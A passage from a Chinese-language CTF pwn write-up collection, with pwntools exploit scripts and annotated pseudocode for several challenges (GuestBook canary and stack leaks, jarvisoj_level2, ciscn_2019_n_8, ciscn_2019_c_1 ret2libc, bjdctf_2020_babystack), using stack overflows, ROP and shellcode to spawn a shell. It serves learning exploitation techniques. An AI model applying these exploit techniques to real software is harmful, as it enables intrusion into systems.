#溢出后返回到mprotect函数，然后往寄存器中弹参数（实则是往栈中弹参数，然后再通过栈传参，不用管是什么寄存器），分别是mprotect的第一个参数：修改权限的起始地址0x80ea000；第二个参数：修改的长度0x1000；第三个参数：修改的权限等级7
payload += p32(read_addr) + p32(pop_ebx_esi_ebp_ret) + p32(0) + p32(mp1) + p32(0x100)#ret到read函数地址，也向read函数传参；第一个参数：fd=0标准输入；第二个参数：写入数据的地址0x80ea000（因为刚刚已经对这块地址赋予了可读可写可执行权限，；第三个参数：写入的数据最大长度0x100
payload += p32(mp1)#读入shellcode后，跳到已修改地址的起始位置开始执行shellcode

p.sendline(payload)#发送第一段payload，进行修改权限操作和调用read函数操作，为第二段payload提供了写入shellcode的地方
payload1 = asm(shellcraft.sh())#第二段payload生成一串shellcode
p.send(payload1)#写入shellcode
p.interactive()
```



## 技巧类

### 泄露canary

```python
from pwn import *
p = process('./GuestBook')
#p = remote('xxxxxx',8888)
#gdb.attach(p)
elf = ELF('./GuestBook')
context(os="linux",arch="amd64",log_level='debug')

p.sendafter(b'name',0x19*b'a')#0x18+0x1,覆盖canary最低一位的00
p.recvuntil(0x19*b'a')#返回的为buf中的内容，从垃圾数据结束之后开始接收
data = u64(p.recv(7).rjust(8,b'\x00'))#接收canary的前七个字节，再从右边用00补充到8个字节
data+=1#修改canary最低字节的值为01
print("can"+str(hex(data)))

payload = b'a'*152 + p64(data) + b'a'*8 + p64(0x4012c3)#第一次将canary后面的rbp和返回地址布置好，同时布置canary的前七位
payload1 = b'a'*120 +p64(data-1)#第二次溢出将canary的01还原为00，使其能够通过系统检查

p.sendlineafter(b'leave(MAX 4)',str(2))#循环两次
p.sendline(payload)
p.sendline(payload1)
p.interactive()
```

泄露canary的主要思路就是将栈空间覆盖，同时覆盖canary的最低一个字节00，然后去接收返回的数据（前提是由printf或puts函数将变量中的数据输出，例如我们要泄露的是buf中的canary（事实上一旦开启canary，所有变量都会被加上canary），那么伪代码中一定要有puts(buf)之类的输出函数来输出canary的地址。

第二步就是将获取到的canary添加到payload中，因为函数在返回的时候会检测canary的值，如果不相同就会崩溃。所以我们应该构造出形如------b'a'*xxx + p64(canary) + b'a'*8 + p64(retaddr)-----的payload。

==注：canary在rbp的下方（一般都是紧挨着rbp，但出题人可能会改变其位置）结构一般如下：==

-----------------------------------------------

retaddr（这是高地址）

---------------------------------

rbp

-----------------------------------

canary

-------------------------------------------------------

buf（低地址）

-----------------------------------------

题目来源：DASCTF（GuestBook）

### 泄露栈地址

```python
from pwn import *
p = process('./GuestBook')
#p = remote('xxxxxx',8888)
#gdb.attach(p)
elf = ELF('./GuestBook')
context(os="linux",arch="amd64",log_level='debug')
p.sendafter(b'name?',16*b'a')#将buf的栈空间填满，留下rbp
p.recvuntil(16*b'a')
data = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))#接收rbp的地址，读取到0x7f时，从数据最后一个元素开始，向左切6个元素（字节），再用0补充到切片结果的左侧，直到切片结果有8个字节（因为8字节地址很难全部都用到，所以基本上都是只使用6个字节
addr = data - 0x80#泄露的是上一个函数的rbp的地址，即main函数的rbp，gdb调试算出vuln()与main()的rbp相差0x10，而vuln()的rbp与v1相差0x70，故用main的rbp地址减去0x70+0x10，得到v1的入口地址
print("addr = "hex(addr))

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x78,b'\x00') + p64(addr)#先向v1写入shellcode，0x70+0x8=0x78,再返回到v1入口去执行shellcode
p.sendafter(b'strong',payload)
```

==思路就是泄露当前函数的rbp（有时候泄露的是上一个函数的rbp，上述代码就是），再算出rbp到变量的距离，从而找到变量的入口。==

==一般用于写入了shellcode但不知道当前变量的入口在哪里，此时就需要泄露栈地址了==

==上一个函数rbp的地址，作为数据被压入栈中，当前函数的rbp寄存器指向它==

### jarvisoj_level2

太简单了，附上exp：

```python

from pwn import*

p=remote('node3.buuoj.cn',17589)
shell_addr=0x804a024
system=0x8048320

payload=b'a'*(0x88+4)+p32(system)+p32(8)+p32(shell_addr)

p.sendline(payload)
p.interactive()
```

### ciscn_2019_n_8

题目：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL )
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

- 定义一个名为`main`的函数，它接受三个参数：`argc`表示命令行参数的个数，`argv`表示命令行参数的数组，`envp`表示环境变量的数组。

- 定义两个整型变量`v4`和`v5`，它们在栈上分配空间，并用注释标明它们的地址偏移量。

- 定义一个长度为15的整型数组`var`，并将它的第14个和第15个元素初始化为0。

- 调用一个名为`init`的函数，它可能是用来做一些初始化操作的。

- 调用`puts`函数，向标准输出打印一句话：“What’s your name?”，并换行。

- 调用`__isoc99_scanf`函数，从标准输入读取一个字符串，并将其存储在数组`var`中。同时，将变量`v4`和`v5`作为额外的参数传递给该函数，这可能是一个漏洞，因为这两个变量没有被初始化，而且没有被使用。

- 判断数组`var`中第14个和第15个元素组成的64位整数是否为0。如果不为0，则继续判断该整数是否等于17。如果等于17，则调用`system`函数，执行一个名为"/bin/sh"的程序，这可能是一个后门，因为它可以让用户获得一个shell。如果不等于17，则调用`printf`函数，向标准输出打印一句话：“something wrong! val is %d”，并将数组`var`中的所有元素作为参数传递给该函数。

- 如果数组`var`中第14个和第15个元素组成的64位整数为0，则调用`printf`函数，向标准输出打印一句话：“%s, Welcome!\n”，并将数组中存储的字符串作为参数传递给该函数。然后调用`puts`函数，向标准输出打印一句话：“Try do something~”，并换行。

- 最后返回0，表示程序正常结束。

  exp如下：

```python
from pwn import *
p = process('./ciscn_2019_n_8')
#p= remote('pwn.node.game.sycsec.com',30345)
#gdb.attach(p)
elf = ELF('./ciscn_2019_n_8')
context(os="linux",arch="amd64",log_level='debug')

payload = p32(17)*14 
p.sendline(payload)
p.interactive()
```

由伪代码可以看出我们输入的数据会被赋值给var数组，成为var数组中的元素

==因为题目说要让var[13]等于17，也就是让var数组中第14个元素等于17即可，那么我们往数组中填充14个17就可以成功调用system==

==上面的数组中var[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14]，可以看出var[13]其实是第14个元素，故填充14个17就可以覆盖掉第14个元素==

## ret2libc类

### ciscn_2019_c_1

main函数

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);#清空缓冲区
  puts("EEEEEEE                            hh      iii                ");
  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
  puts("====================================================================");
  puts("Welcome to this Encryption machine\n");
  begin();#自定义函数-----------
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf("%d", &v4);#第一次输入
      getchar();#输入函数
      if ( v4 != 2 )
        break;
      puts("I think you can do it by yourself");
      begin();
    }
    if ( v4 == 3 )
    {
      puts("Bye!");
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();#自定义函数--------------重点
    begin();
  }
  puts("Something Wrong!");
  return 0;
}
```

分析上面的伪代码，可以发现while中的代码是防止我们输入其他的数字，如果在scanf输入了1，2,3以外的数字，程序就会报错。如果是123其中之一，则会进入encrypt函数

begin()函数：

```python
int begin()
{
  puts("====================================================================");
  puts("1.Encrypt");
  puts("2.Decrypt");
  puts("3.Exit");
  return puts("Input your choice!");
}
```



encrypt()函数：

```python
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

while中有一段加密算法，应该是异或之类的，但实际上我们不需要去解密。这里的gets是我们第二次的输入点，绕过strlen函数，就不用去管这个加密算法了，但由于没有system函数所以判断是ret2libc

==运行时：==

```python
┌──(root㉿tangjunyi)-[/home/tangjunyi/pwn]
└─# ./ciscn_2019_c_1                                 
EEEEEEE                            hh      iii                
EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  
EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e 
EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  
EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee 
====================================================================
Welcome to this Encryption machine

====================================================================
1.Encrypt
2.Decrypt
3.Exit
Input your choice!
1#第一次输入
Input your Plaintext to be encrypted
1111#第二次输入
Ciphertext
>>>>
====================================================================#第二次循环
1.Encrypt
2.Decrypt
3.Exit
Input your choice!
```

综上所述程序一共提供了两次输入机会，第一次只能输入1 2 3，但第二次输入可以发生栈溢出（因为第二次输入发生在encrypt函数中，而在这个函数中我们发现了gets函数）

exp如下：

```python
from pwn import*

p=remote('node4.buuoj.cn',25635)
elf=ELF('./ciscn_2019_c_1')

main = 0x400b28#main函数的入口，为了进行第二次溢出
pop_rdi_ret = 0x400c83
ret = 0x4006b9#使用ROPgadget找到一个ret指令平衡栈

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

p.sendlineafter(b'choice!\n','1')
payload=b'\x00'+b'a'*87 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendlineafter(b'encrypted\n',payload)#第一次溢出，获取puts的真实地址
p.recvline()#接收到【Ciphertext >>>>】后换行继续接收
p.recvline()#接收到【1.Encrypt 2.Decrypt3.Exit】后换行，此时进行到了【Input your choice!】

puts_addr=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))#接收puts真实地址
print("puts_addr ="+hex(puts_addr)) #获取了puts的真实地址后，在libcdatabase中输入puts低三位找到libc版本，进而找到其他函数的偏移量
libc_base = puts_addr - 0x0809c0#算出基地址
binsh_addr = libc_base + 0x1b3e9a
system_addr = libc_base + 0x04f440
p.sendlineafter(b'choice!\n','1')

payload=b'\x00'+ b'a'*87 + p64(ret) + p64(pop_rdi_ret)  + p64(binsh_addr) + p64(system_addr)

p.sendlineafter('encrypted\n',payload)#第二次溢出：栈溢出的输入点是在【Input your Plaintext to be encrypted】之后

p.interactive()

```

## 整形溢出

### bjdctf_2020_babystack

ida查看main函数：

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);#这个输入规定了我们下次read读入的长度，所以要进行整数溢出，让他变得很大，方便下面的read进行溢出
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);#nbytes是无符号类型，如果输入一个负数，会让它变得很大
  return 0;
}
```



```python
from pwn import *
from LibcSearcher import *
p = process('./sw')
#gdb.attach(p) #open gdb
context(os="linux",arch="amd64",log_level='debug')
elf = ELF('./sw')
#p = remote('node6.anna.nssctf.cn',28969)

backdoor = 0x4006ea
payload = b'a'*24 + p64(backdoor)
p.sendlineafter(b'your name:','-1')#对于无符号数nbytes，负数会让他变得很大
p.recv()

p.send(payload)
p.interactive()

```





